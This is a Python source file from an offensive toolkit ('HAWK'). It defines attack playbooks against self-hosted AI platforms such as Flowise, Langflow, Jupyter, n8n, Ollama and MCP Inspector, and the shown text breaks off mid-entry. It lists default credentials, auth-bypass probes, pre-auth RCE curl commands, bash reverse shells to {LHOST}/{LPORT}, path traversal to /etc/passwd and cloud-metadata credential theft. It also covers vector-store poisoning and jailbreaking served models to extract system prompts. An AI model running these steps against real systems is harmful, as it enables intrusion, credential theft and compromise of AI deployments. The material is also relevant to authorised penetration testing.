# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — AI Ops Playbooks.

Curated, offline registry of self-hosted "AI ops" platforms (LLM
workflow builders, model serving, MLOps, RAG, agent frameworks,
notebook servers, vector databases, image-gen UIs).  Pattern
recognised from real engagements + HTB 2024-2026 boxes: every one of
these tools ships with a generous code-execution surface (custom-
tool nodes, code-eval endpoints, webhooks, notebooks, code-
interpreter sandboxes) and frequently lands in production with
default creds, auth bypasses, or no auth at all.

When whatweb / Web Oracle / nuclei reports a fingerprint that
matches one of these, HAWK pushes a CRITICAL "AI Ops Target —
<tool>" finding straight into Target Intel with the deterministic
playbook (default creds, auth-bypass probes ready to run, RCE
vector, next-step suggestions, references).

CVE coverage is INTENTIONALLY OUTSOURCED to live web search
(Google + GitHub Security Advisories + ExploitDB + Packet Storm)
via the `🔍 SEARCH CVE` button on the AI-OPS finding.  The button
opens four browser tabs pre-filled with `<tool> <version>` so the
operator reads CURRENT public PoCs / writeups instead of relying on
a hardcoded CVE list that ages out within weeks.  This decision
also makes the registry cheap to extend — every new entry is ~20
lines of declarative dict, no CVE research required.

Schema
──────
Each entry has these fields:

    id                Stable slug for cross-referencing.
    name              Display name (also used as web-search keyword).
    category          Tag (informational).
    signatures        List of substrings (case-insensitive) — match
                      on the finding's title + description.  Stay
                      tight (multi-word, qualified) to avoid false
                      positives.
    default_ports     List of TCP ports the tool is typically seen
                      on.
    version_endpoint  HTTP path that returns the running version.
                      Empty string when the tool has no public
                      version probe.
    login_endpoint    HTTP path of the login form (POST JSON).
                      Empty when the tool has no auth.
    default_creds     List of (username, password) tuples.  Empty
                      when no documented defaults.
    auth_bypass_probes List of dicts:
                        - "path":    URL path
                        - "method":  GET / POST / ...
                        - "headers": optional dict
                        - "body":    optional JSON / form body
                        - "label":   short label for the result line
                        - "expect":  human description of what a
                                     successful response looks like
    rce_vector        Plain-English description of the typical post-
                      auth code execution path on this product.
    next_steps        Numbered playbook steps the operator should
                      follow.  Use {target}, {scheme}, {port},
                      {LHOST}, {LPORT} placeholders — substituted
                      at render time.
    references        Project / docs URLs (no CVE mirrors — see
                      module docstring).

Adding a new entry
──────────────────
Only the bare minimum is required: ``id``, ``name``, ``signatures``.
All other fields default sensibly when omitted (see ``_normalise``
below).  A typical Fase-2 entry takes ~10 minutes of research
(default port + version endpoint + one or two known unauth paths).
"""

from __future__ import annotations

import re

# ── Registry ──────────────────────────────────────────────────────────────
# Order: roughly grouped by category, but every entry is matched
# independently against the same blob so order is not load-bearing.

AIOPS_REGISTRY: list[dict] = [

    # ════════════════════════════════════════════════════════════════
    # FASE 1 — top-12 tools seen on HTB 2024-2026 + real engagements.
    # ════════════════════════════════════════════════════════════════

    {
        "id": "anythingllm",
        "name": "AnythingLLM",
        "category": "RAG / chat-with-docs (Mintplex Labs)",
        "signatures": [
            "AnythingLLM",
            "Mintplex Labs",
            "anything-llm",
        ],
        "default_ports": [3001, 80, 443],
        "version_endpoint": "/api/ping",
        "login_endpoint": "/api/request-token",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/ping", "method": "GET",
             "label": "ping (no auth expected)",
             "expect": "200 OK if reachable"},
            {"path": "/api/system/check-token", "method": "GET",
             "label": "check-token leak",
             "expect": "200 with system info means single-user mode"},
            {"path": "/api/v1/system/env-dump", "method": "GET",
             "label": "env dump (older builds)",
             "expect": "200 with .env contents"},
        ],
        "rce_vector": (
            "Authenticated agents / workspaces allow custom JavaScript "
            "skills.  Path-traversal + SSRF CVEs in document upload / "
            "connector code permit arbitrary file read and, in older "
            "versions, write — escalate to RCE through loaded scripts."),
        "next_steps": [
            "Hit /api/ping to confirm reachability.",
            "If single-user mode, /api/system/check-token reveals the "
            "API token in clear — paste it into Authorization: Bearer "
            "to get full admin.",
            "Once admin: upload a poisoned doc that triggers SSRF, or "
            "use the Workspace agent JS skills for code exec.",
        ],
        "references": [
            "https://github.com/Mintplex-Labs/anything-llm",
            "https://docs.anythingllm.com/",
        ],
    },

    {
        "id": "dify",
        "name": "Dify",
        "category": "LLM workflow + RAG (LangGenius)",
        "signatures": [
            "LangGenius",
            "Dify.AI",
            "Dify - The Innovation Engine",
            "dify-api",
        ],
        "default_ports": [80, 443, 5001, 8080],
        "version_endpoint": "/console/api/version",
        "login_endpoint": "/console/api/login",
        "default_creds": [
            ("admin@dify.ai", "admin"),
        ],
        "auth_bypass_probes": [
            {"path": "/console/api/setup", "method": "GET",
             "label": "setup wizard re-trigger",
             "expect": "200 means setup unfinished — you can claim "
                       "the admin account by POSTing to /setup"},
            {"path": "/console/api/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON version"},
            {"path": "/v1/workspaces/current", "method": "GET",
             "label": "workspace info (no auth on some builds)",
             "expect": "200 with workspace JSON"},
        ],
        "rce_vector": (
            "The 'Code' node in workflows runs Python in a sandbox; "
            "sandbox-escape CVEs surface periodically.  HTTP Request "
            "node permits SSRF to internal metadata endpoints "
            "(AWS / GCP IMDS).  Tool plugins can execute arbitrary "
            "shell when the operator-provided plugin is malicious."),
        "next_steps": [
            "Probe /console/api/setup — if it returns 200, the install "
            "never finished setup.  POST to it to create your own admin.",
            "Login → create new App of type 'Workflow' → add a 'Code' "
            "node → paste a Python reverse-shell snippet → RUN.",
            "If sandbox blocks os.system, try the HTTP Request node "
            "pointing at 169.254.169.254 (cloud metadata) for credential "
            "exfiltration.",
        ],
        "references": [
            "https://github.com/langgenius/dify",
            "https://docs.dify.ai/",
        ],
    },

    {
        "id": "flowise",
        "name": "Flowise",
        "category": "LLM workflow builder (FlowiseAI, Node.js)",
        "signatures": [
            "FlowiseAI",
            "Flowise - Build AI",
            "Flowise ",   # trailing space avoids matching 'Langflow'
            "Meta-Author[FlowiseAI]",
            "flowise-ui",
        ],
        "default_ports": [3000, 80, 443, 8080],
        "version_endpoint": "/api/v1/version",
        "login_endpoint": "/api/v1/account/login",
        "default_creds": [
            ("admin@admin.com", "admin"),
            ("admin", "admin"),
            ("admin", "FlowiseAI"),
            ("admin", "changeme"),
        ],
        "auth_bypass_probes": [
            {"path": "/api/v1/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON version"},
            {"path": "/api/v1/ping", "method": "GET",
             "label": "ping (always public)",
             "expect": "200 'pong'"},
            {"path": "/api/v1/credentials", "method": "GET",
             "label": "credentials list (lowercase)",
             "expect": "401 normally — 200 means an auth bypass landed"},
            {"path": "/api/v1/CREDENTIALS", "method": "GET",
             "label": "credentials list (UPPERCASE — case-mismatch "
                      "bypass on older 1.x builds)",
             "expect": "200 with JSON array bypasses auth"},
            {"path": "/api/v1/chatflows", "method": "GET",
             "label": "chatflows list",
             "expect": "401 normally"},
        ],
        "rce_vector": (
            "Authenticated admin can create a Tool of type 'Custom Tool' "
            "whose JavaScript body runs server-side in the Node.js "
            "process — call `require('child_process').exec` for direct "
            "RCE.  Equivalent path: 'Custom Function' node inside a "
            "Chatflow.  In 3.x, an unauth password-reset-token leak in "
            "/api/v1/account/forgot-password (with the body shape "
            "`{\"user\":{\"email\":\"victim@host\"}}`) returns the "
            "tempToken in the response — combine with /api/v1/account/"
            "reset-password to take over a known account, then RCE via "
            "Custom Tool."),
        "next_steps": [
            "Confirm version: GET /api/v1/version.",
            "Try the case-mismatch bypass on /api/v1/CREDENTIALS — "
            "if 200, you have read-access without auth (often leaks "
            "OpenAI keys, GitHub PAT, DB strings in clear).",
            "Open SEARCH CVE for the version returned in step 1 — pulls "
            "the live PoC from Google / GitHub Security Advisories.",
            "Once admin: Tools → + Custom Tool → JavaScript field:\n"
            "    const {exec} = require('child_process');\n"
            "    exec('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"');\n"
            "  → Save → Add to a Chatflow → trigger via /api/v1/prediction.",
        ],
        "references": [
            "https://github.com/FlowiseAI/Flowise",
            "https://docs.flowiseai.com/",
        ],
    },

    {
        "id": "jupyter",
        "name": "Jupyter (Notebook / Lab / Hub)",
        "category": "Notebook server (Project Jupyter)",
        "signatures": [
            "JupyterLab",
            "Jupyter Notebook",
            "JupyterHub",
            "jupyter-server",
        ],
        "default_ports": [8888, 8000, 8080, 8081],
        "version_endpoint": "/api",
        "login_endpoint": "/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api", "method": "GET",
             "label": "API metadata (always public)",
             "expect": "200 with JSON {version} — confirms reachability"},
            {"path": "/api/contents/", "method": "GET",
             "label": "filesystem listing (no token)",
             "expect": "200 with JSON listing means no auth — pwn"},
            {"path": "/tree", "method": "GET",
             "label": "tree UI (no token)",
             "expect": "200 with HTML directory tree means no auth"},
            {"path": "/terminals", "method": "GET",
             "label": "terminal UI (no token)",
             "expect": "200 means /terminals/new gives a live shell"},
        ],
        "rce_vector": (
            "Once you can reach /tree or /lab without a token, the "
            "notebook server itself IS the RCE primitive: open a new "
            "terminal (/terminals/new) or create a notebook and run a "
            "cell — both execute as the user running the Jupyter "
            "process."),
        "next_steps": [
            "GET /api — gives you the Jupyter version.",
            "Hit /tree without a token.  200 = no auth, jackpot.",
            "Open /terminals/new — interactive shell as the Jupyter "
            "user.  No exploit needed.",
            "If a token IS required, search the page source / JS "
            "bundles for a leaked one.  XSRF cookie often leaks too.",
        ],
        "references": [
            "https://jupyter-server.readthedocs.io/en/latest/operators/security.html",
            "https://github.com/jupyter-server/jupyter_server",
        ],
    },

    {
        "id": "langflow",
        "name": "LangFlow",
        "category": "LLM workflow builder (LangChain spin-off)",
        "signatures": [
            "Langflow",
            "logspace/langflow",
            "langflow-frontend",
        ],
        "default_ports": [7860, 80, 443, 3000],
        "version_endpoint": "/api/v1/version",
        "login_endpoint": "/api/v1/login",
        "default_creds": [
            ("admin", "admin"),
            ("admin", "langflow"),
        ],
        "auth_bypass_probes": [
            {"path": "/api/v1/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON version"},
            {"path": "/api/v1/validate/code", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"code": "print(\\"hawk_probe\\")"}',
             "label": "code-validate RCE (CVE-2024-7298 family)",
             "expect": "200 with no auth required = pre-auth RCE — "
                       "the body is exec'd server-side"},
        ],
        "rce_vector": (
            "Pre-auth Python RCE via /api/v1/validate/code on older "
            "builds: POST a Python payload and Langflow runs it server-"
            "side without checking auth.  The 'Custom Component' node "
            "provides the same primitive once authenticated."),
        "next_steps": [
            "Confirm: GET /api/v1/version.",
            "Open SEARCH CVE for the version returned — get the current "
            "exploit (validate/code is patched on recent builds).",
            "If pre-auth path is open:\n"
            "    curl -X POST http://{target}:{port}/api/v1/validate/code \\\n"
            "      -H 'Content-Type: application/json' \\\n"
            "      -d '{\"code\":\"import os; os.system(\\\"id\\\")\"}'",
        ],
        "references": [
            "https://github.com/langflow-ai/langflow",
            "https://docs.langflow.org/",
        ],
    },

    {
        "id": "librechat",
        "name": "LibreChat",
        "category": "Multi-LLM chat UI (Danny Avila)",
        "signatures": [
            "LibreChat",
            "librechat-ui",
        ],
        "default_ports": [3080, 80, 443],
        "version_endpoint": "/api/config",
        "login_endpoint": "/api/auth/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/config", "method": "GET",
             "label": "config disclosure",
             "expect": "200 with JSON listing every enabled provider, "
                       "model, social-login client ID"},
            {"path": "/api/auth/refresh", "method": "POST",
             "label": "refresh-token without proof",
             "expect": "401 normally — 200 with JWT means a token "
                       "leak / fixation bug"},
            {"path": "/api/user", "method": "GET",
             "label": "user info no auth",
             "expect": "401 normally — 200 = auth bypass"},
        ],
        "rce_vector": (
            "Not a primary RCE target.  Value is in user enumeration, "
            "leaked OAuth client IDs, and the registration-open default "
            "that lets you self-create an admin account.  Once admin, "
            "plugin endpoints can execute server-side actions."),
        "next_steps": [
            "GET /api/config — leaks every enabled provider + client "
            "IDs (handy for OAuth abuse later).",
            "POST /api/auth/register — if signup is open (default), "
            "create an account, then check whether you can elevate to "
            "admin by editing the user role via /api/user.",
        ],
        "references": [
            "https://github.com/danny-avila/LibreChat",
            "https://docs.librechat.ai/",
        ],
    },

    {
        "id": "mcp_inspector",
        "name": "MCP Inspector / MCPJam Inspector",
        "category": "MCP debug UI (Anthropic / forks)",
        "signatures": [
            "MCPJam Inspector",
            "MCP Inspector",
            "@modelcontextprotocol/inspector",
        ],
        "default_ports": [6274, 5173, 6277, 80],
        "version_endpoint": "/",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/", "method": "GET",
             "label": "homepage reachable",
             "expect": "200 with HTML containing 'MCP Inspector' / "
                       "'MCPJam Inspector'"},
            {"path": "/api/mcp/connect", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"serverName":"hawk","command":"id","args":[]}',
             "label": "MCP connect RCE (pre-auth)",
             "expect": "200 with stdout of `id` in body = pre-auth RCE"},
        ],
        "rce_vector": (
            "POST /api/mcp/connect accepts a 'command' field that the "
            "server execv()s with no authentication and no allow-list "
            "— the entire purpose of the field is to launch an MCP "
            "server, but the implementation never sandboxes it."),
        "next_steps": [
            "Confirm fingerprint (page title 'MCP Inspector').",
            "Reverse shell:\n"
            "    curl -X POST http://{target}:{port}/api/mcp/connect \\\n"
            "      -H 'Content-Type: application/json' \\\n"
            "      -d '{\"serverName\":\"x\",\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"]}'",
            "Open SEARCH CVE for the exact build to confirm the patch "
            "level on the current target.",
        ],
        "references": [
            "https://github.com/modelcontextprotocol/inspector",
            "https://modelcontextprotocol.io/",
        ],
    },

    {
        "id": "mlflow",
        "name": "MLflow",
        "category": "MLOps experiment / model registry (Databricks)",
        "signatures": [
            "MLflow",
            "mlflow-ui",
        ],
        "default_ports": [5000, 8080, 80, 443],
        "version_endpoint": "/version",
        "login_endpoint": "/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with plaintext semver — confirms MLflow"},
            {"path": "/api/2.0/mlflow/experiments/search",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"max_results": 10}',
             "label": "experiments search (no auth on default deploy)",
             "expect": "200 with JSON list of experiments = no auth"},
            {"path": "/api/2.0/mlflow-artifacts/artifacts/"
                     "../../../../etc/passwd", "method": "GET",
             "label": "artifact path traversal",
             "expect": "200 with /etc/passwd content = LFI"},
        ],
        "rce_vector": (
            "Multiple LFI/RFI/RCE CVEs in artifact handlers.  The "
            "model-loading path imports arbitrary pickled Python "
            "objects → RCE on `mlflow models serve` of an attacker-"
            "controlled artifact."),
        "next_steps": [
            "GET /version — confirms MLflow + version.",
            "POST /api/2.0/mlflow/experiments/search → if 200, no auth; "
            "you can list / read / write all experiments.",
            "Try the /etc/passwd path traversal probe to confirm LFI.",
            "For RCE: register a malicious pickled model, get the "
            "victim to `mlflow models serve` it.",
        ],
        "references": [
            "https://mlflow.org/docs/latest/auth/index.html",
            "https://github.com/mlflow/mlflow",
        ],
    },

    {
        "id": "n8n",
        "name": "n8n",
        "category": "Workflow automation (with AI nodes)",
        "signatures": [
            "n8n.io",
            "n8n - workflow",
            "n8n-editor-ui",
        ],
        "default_ports": [5678, 80, 443],
        "version_endpoint": "/rest/settings",
        "login_endpoint": "/rest/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/rest/settings", "method": "GET",
             "label": "settings (always public)",
             "expect": "200 with JSON — confirms n8n + reveals if "
                       "user-management is enabled"},
            {"path": "/rest/owner/setup", "method": "GET",
             "label": "owner-setup re-trigger",
             "expect": "200 with JSON {needsSetup:true} = you can "
                       "claim the owner account by POSTing"},
            {"path": "/webhook/", "method": "GET",
             "label": "webhook root",
             "expect": "Listing or 404 — but specific webhook paths "
                       "are reachable WITHOUT auth by design"},
        ],
        "rce_vector": (
            "n8n's 'Code' (formerly 'Function') node runs JavaScript "
            "in a vm2 sandbox; multiple sandbox-escape CVEs over the "
            "years.  Workflows can also be triggered via webhooks "
            "with no auth, and the 'Execute Command' node — when "
            "enabled (NODE_FUNCTION_ALLOW_EXTERNAL=*) — runs "
            "arbitrary OS commands."),
        "next_steps": [
            "GET /rest/settings — confirms n8n.",
            "GET /rest/owner/setup → if needsSetup is true, claim "
            "ownership via POST /rest/owner/setup with your own "
            "email/password.",
            "Once admin: create a Workflow → add a 'Code' node → "
            "JavaScript: require('child_process').exec(...).  If vm2 "
            "blocks, try the 'Execute Command' node directly.",
            "Enumerate exposed webhooks: every /webhook/<id> path is "
            "callable without auth — fuzz with ffuf.",
        ],
        "references": [
            "https://github.com/n8n-io/n8n",
            "https://docs.n8n.io/",
        ],
    },

    {
        "id": "ollama",
        "name": "Ollama",
        "category": "Local LLM serving (Ollama)",
        "signatures": [
            "Ollama is running",
            "ollama-server",
        ],
        "default_ports": [11434, 80, 443],
        "version_endpoint": "/api/version",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON {version} — Ollama has NO auth "
                       "by default, so anything that responds is open"},
            {"path": "/api/tags", "method": "GET",
             "label": "list models",
             "expect": "200 with JSON list of models loaded on the "
                       "server"},
            {"path": "/api/ps", "method": "GET",
             "label": "running models",
             "expect": "200 with JSON list of currently-loaded models"},
        ],
        "rce_vector": (
            "The /api/pull endpoint accepts a model 'digest' that the "
            "server treats as a path component when writing the model "
            "file to disk.  A crafted digest → arbitrary file write → "
            "RCE via library / config overwrite (e.g. /etc/ld.so.preload)."),
        "next_steps": [
            "GET /api/version + /api/tags — no auth, you have free "
            "inference + see what models the operator is shipping.",
            "Inference abuse: POST /api/generate is a free LLM for "
            "your prompts; useful for OSINT / phishing prep.",
            "RCE via path-traversal in /api/pull: POST with a poisoned "
            "model name to write arbitrary file, then trigger via "
            "/api/generate.  Open SEARCH CVE to grab the current PoC.",
        ],
        "references": [
            "https://github.com/ollama/ollama",
            "https://github.com/ollama/ollama/blob/main/docs/faq.md",
        ],
    },

    {
        "id": "open_webui",
        "name": "Open WebUI (Ollama UI)",
        "category": "Self-hosted LLM web UI",
        "signatures": [
            "Open WebUI",
            "open-webui",
            "ollama-webui",
        ],
        "default_ports": [8080, 3000, 80, 443],
        "version_endpoint": "/api/version",
        "login_endpoint": "/api/v1/auths/signin",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/version", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON {version}"},
            {"path": "/api/config", "method": "GET",
             "label": "config / signup status",
             "expect": "200 with JSON containing 'features.enable_signup' "
                       "— if true, anyone can register"},
            {"path": "/api/v1/auths/signup", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"name":"hawk","email":"h@h.h","password":"hawk1234"}',
             "label": "open signup probe",
             "expect": "200 with token = signup is open and the FIRST "
                       "signup becomes admin"},
        ],
        "rce_vector": (
            "Once admin: Workspaces / Functions / Tools panes accept "
            "Python code that runs server-side in the Open WebUI "
            "container.  SSRF CVEs in document upload + RAG pipeline "
            "let unauthenticated users probe internal metadata "
            "services."),
        "next_steps": [
            "Confirm /api/version + /api/config.",
            "If config.features.enable_signup is true and there are no "
            "users yet, the first signup becomes admin.  Try POST "
            "/api/v1/auths/signup.",
            "Once admin: Workspaces → Functions → New → paste a Python "
            "reverse-shell function → call it.",
        ],
        "references": [
            "https://github.com/open-webui/open-webui",
            "https://docs.openwebui.com/",
        ],
    },

    {
        "id": "vllm_tgi",
        "name": "vLLM / Text Generation Inference",
        "category": "Production LLM serving (OpenAI-compatible API)",
        "signatures": [
            "vLLM",
            "text-generation-inference",
            "huggingface/text-generation-inference",
        ],
        "default_ports": [8000, 8080, 80, 443],
        "version_endpoint": "/v1/models",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/models", "method": "GET",
             "label": "OpenAI-compat models list",
             "expect": "200 with JSON {data:[{id,...}]} — confirms the "
                       "server + lists models loaded"},
            {"path": "/health", "method": "GET",
             "label": "health probe",
             "expect": "200 with JSON {status:ok}"},
            {"path": "/info", "method": "GET",
             "label": "info (TGI specific)",
             "expect": "200 with JSON {model_id, dtype, ...}"},
        ],
        "rce_vector": (
            "Not a direct RCE target.  Value is in: (a) free inference "
            "on the operator's GPU + bandwidth, (b) prompt injection / "
            "jailbreak of the base model, (c) leak of system prompt / "
            "fine-tune data via extraction prompts, (d) exposure of "
            "API key the operator forgot to set."),
        "next_steps": [
            "GET /v1/models — see what's loaded.",
            "POST /v1/completions { 'model':<id>, 'prompt':... } — "
            "inference is free.",
            "Try jailbreak prompts to extract the system prompt or any "
            "fine-tune data.",
        ],
        "references": [
            "https://docs.vllm.ai/",
            "https://huggingface.co/docs/text-generation-inference",
        ],
    },

    # ════════════════════════════════════════════════════════════════
    # FASE 2 — broader enterprise / lab coverage.  Same minimal shape,
    # CVE coverage delegated to the SEARCH CVE button on the finding
    # (Google + GitHub Security Advisories + ExploitDB + Packet Storm).
    # ════════════════════════════════════════════════════════════════

    {
        "id": "a1111_sd",
        "name": "Stable Diffusion WebUI (AUTOMATIC1111)",
        "category": "Image-gen UI (Gradio)",
        "signatures": [
            "Stable Diffusion",
            "AUTOMATIC1111",
            "stable-diffusion-webui",
        ],
        "default_ports": [7860, 80, 443],
        "version_endpoint": "/internal/sysinfo",
        "login_endpoint": "/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/sdapi/v1/sd-models", "method": "GET",
             "label": "OpenAPI: list installed SD models",
             "expect": "200 with JSON list"},
            {"path": "/internal/sysinfo", "method": "GET",
             "label": "system info (Python, GPU, paths)",
             "expect": "200 with full JSON dump"},
        ],
        "rce_vector": (
            "Custom-script and extension panels run Python.  Multiple "
            "path-traversal CVEs in the file API allow arbitrary file "
            "read on the host."),
        "next_steps": [
            "GET /sdapi/v1/sd-models confirms reachability + reveals "
            "model list.",
            "Open SEARCH CVE to pull the current pre-auth path-"
            "traversal PoC for the running version.",
        ],
        "references": [
            "https://github.com/AUTOMATIC1111/stable-diffusion-webui",
        ],
    },

    {
        "id": "agentgpt",
        "name": "AgentGPT",
        "category": "Browser-based autonomous agent (Reworkd)",
        "signatures": [
            "AgentGPT",
            "Reworkd",
            "agentgpt",
        ],
        "default_ports": [3000, 80, 443],
        "version_endpoint": "/api/health",
        "login_endpoint": "/api/auth/signin",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/health", "method": "GET",
             "label": "health probe",
             "expect": "200 with JSON status"},
            {"path": "/api/agent/start", "method": "POST",
             "label": "agent start (sometimes unauth on dev builds)",
             "expect": "200 with JSON or 401"},
        ],
        "rce_vector": (
            "Tool plugins can run arbitrary Python / shell when the "
            "operator enables the 'os' tool.  Prompt-injection in "
            "model output can chain into tool execution → RCE."),
        "next_steps": [
            "Confirm health endpoint reachable.",
            "Open SEARCH CVE for the deployed version.",
        ],
        "references": [
            "https://github.com/reworkd/AgentGPT",
        ],
    },

    {
        "id": "autogpt",
        "name": "AutoGPT",
        "category": "Autonomous agent platform (Significant Gravitas)",
        "signatures": [
            "AutoGPT",
            "Significant-Gravitas/AutoGPT",
            "autogpt-platform",
        ],
        "default_ports": [3000, 8000, 8080, 80, 443],
        "version_endpoint": "/api/v1/health",
        "login_endpoint": "/api/v1/auth/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/v1/health", "method": "GET",
             "label": "health",
             "expect": "200 with JSON"},
            {"path": "/graph", "method": "GET",
             "label": "graph editor (sometimes unauth)",
             "expect": "200 with HTML/JSON"},
        ],
        "rce_vector": (
            "Tool / block execution runs Python in-process.  When the "
            "operator enables the shell block, arbitrary OS commands "
            "are reachable from any authenticated user."),
        "next_steps": [
            "Probe the health endpoint to confirm AutoGPT.",
            "Open SEARCH CVE — AutoGPT moves fast, recent CVEs likely.",
        ],
        "references": [
            "https://github.com/Significant-Gravitas/AutoGPT",
        ],
    },

    {
        "id": "bentoml",
        "name": "BentoML",
        "category": "Model serving / runtime (BentoML)",
        "signatures": [
            "BentoML",
            "bentoml/yatai",
            "bento-server",
        ],
        "default_ports": [3000, 5000, 8000, 80, 443],
        "version_endpoint": "/healthz",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/healthz", "method": "GET",
             "label": "health (always public)",
             "expect": "200 'OK'"},
            {"path": "/docs.json", "method": "GET",
             "label": "OpenAPI schema",
             "expect": "200 with full JSON spec — tells you every "
                       "endpoint and required body shape"},
        ],
        "rce_vector": (
            "Model serving endpoints accept pickled / cloudpickle "
            "payloads.  Pickle deserialization → RCE.  Custom "
            "runners may also evaluate user-provided code."),
        "next_steps": [
            "GET /docs.json to enumerate all served endpoints.",
            "POST a pickle payload to a runner endpoint that accepts "
            "binary input.  Open SEARCH CVE for current pickle-RCE "
            "advisory.",
        ],
        "references": [
            "https://github.com/bentoml/BentoML",
        ],
    },

    {
        "id": "chatbot_ui",
        "name": "ChatBot UI",
        "category": "Self-hosted ChatGPT-like UI (mckaywrigley)",
        "signatures": [
            "Chatbot UI",
            "chatbot-ui",
            "mckaywrigley/chatbot-ui",
        ],
        "default_ports": [3000, 80, 443],
        "version_endpoint": "/api/health",
        "login_endpoint": "/api/auth/signin",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/health", "method": "GET",
             "label": "health",
             "expect": "200 with JSON"},
            {"path": "/api/keys", "method": "GET",
             "label": "API keys leak (older builds)",
             "expect": "401 normally — 200 leaks OpenAI keys"},
        ],
        "rce_vector": (
            "Not a direct RCE target.  Value is in OpenAI key "
            "exfiltration via /api/keys + abuse of any connected "
            "Supabase backend (separate attack surface)."),
        "next_steps": [
            "GET /api/keys — if 200, you have the OpenAI key.",
            "Inspect connected DB (Supabase) for further pivots.",
        ],
        "references": [
            "https://github.com/mckaywrigley/chatbot-ui",
        ],
    },

    {
        "id": "chromadb",
        "name": "ChromaDB",
        "category": "Open-source embedding database (Chroma)",
        "signatures": [
            "Chroma",
            "chromadb",
            "chroma-server",
        ],
        "default_ports": [8000, 80, 443],
        "version_endpoint": "/api/v1/version",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/v1/heartbeat", "method": "GET",
             "label": "heartbeat (always public)",
             "expect": "200 with JSON {nanosecond heartbeat}"},
            {"path": "/api/v1/version", "method": "GET",
             "label": "version",
             "expect": "200 with semver string"},
            {"path": "/api/v1/collections", "method": "GET",
             "label": "list collections (no auth on default deploy)",
             "expect": "200 with JSON list = full read access"},
        ],
        "rce_vector": (
            "Default deploy has NO auth.  Read/write any collection → "
            "exfil embeddings + metadata, poison the vector store to "
            "manipulate downstream RAG."),
        "next_steps": [
            "GET /api/v1/collections — list everything stored.",
            "Read embeddings + metadata via /api/v1/collections/<name>/get.",
            "Poison: insert your own vectors so the next RAG query "
            "returns your prompt-injection payload.",
        ],
        "references": [
            "https://docs.trychroma.com/",
            "https://github.com/chroma-core/chroma",
        ],
    },

    {
        "id": "clearml",
        "name": "ClearML",
        "category": "MLOps experiment tracking (ClearML / Allegro)",
        "signatures": [
            "ClearML",
            "Allegro AI",
            "clearml-server",
            "trains-server",
        ],
        "default_ports": [8080, 8008, 8081, 80, 443],
        "version_endpoint": "/api/info",
        "login_endpoint": "/api/auth.login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/info", "method": "GET",
             "label": "version disclosure",
             "expect": "200 with JSON {version}"},
            {"path": "/version.json", "method": "GET",
             "label": "alt version path",
             "expect": "200 with JSON"},
        ],
        "rce_vector": (
            "Pickle-based artifact loading + Python code stored in "
            "tasks → RCE when an operator runs `clearml-task --reuse-"
            "task` against a malicious task."),
        "next_steps": [
            "Confirm /api/info reachable.",
            "Open SEARCH CVE for the version returned.",
        ],
        "references": [
            "https://github.com/allegroai/clearml-server",
            "https://clear.ml/docs/",
        ],
    },

    {
        "id": "cog",
        "name": "Cog (Replicate)",
        "category": "Container model runtime (Replicate)",
        "signatures": [
            "replicate/cog",
            "cog-server",
            "Cog Predict",
            "X-Cog-Version",
        ],
        "default_ports": [5000, 80, 443],
        "version_endpoint": "/health-check",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/health-check", "method": "GET",
             "label": "health (always public)",
             "expect": "200 with JSON {status:HEALTHY}"},
            {"path": "/openapi.json", "method": "GET",
             "label": "OpenAPI schema",
             "expect": "200 with full schema dump"},
        ],
        "rce_vector": (
            "Predictions endpoint accepts arbitrary input.  When the "
            "underlying model has a Python predict() function that "
            "shells out, attacker-controlled input → RCE."),
        "next_steps": [
            "GET /openapi.json — enumerate predict endpoint inputs.",
            "POST /predictions with crafted input.",
        ],
        "references": [
            "https://github.com/replicate/cog",
        ],
    },

    {
        "id": "comfyui",
        "name": "ComfyUI",
        "category": "Node-based image-gen UI",
        "signatures": [
            "ComfyUI",
            "comfyanonymous",
        ],
        "default_ports": [8188, 80, 443],
        "version_endpoint": "/system_stats",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/system_stats", "method": "GET",
             "label": "system stats (always public)",
             "expect": "200 with JSON {system, devices}"},
            {"path": "/object_info", "method": "GET",
             "label": "node catalog",
             "expect": "200 with full JSON listing every loaded node"},
            {"path": "/history", "method": "GET",
             "label": "queued / past prompts",
             "expect": "200 with JSON history"},
        ],
        "rce_vector": (
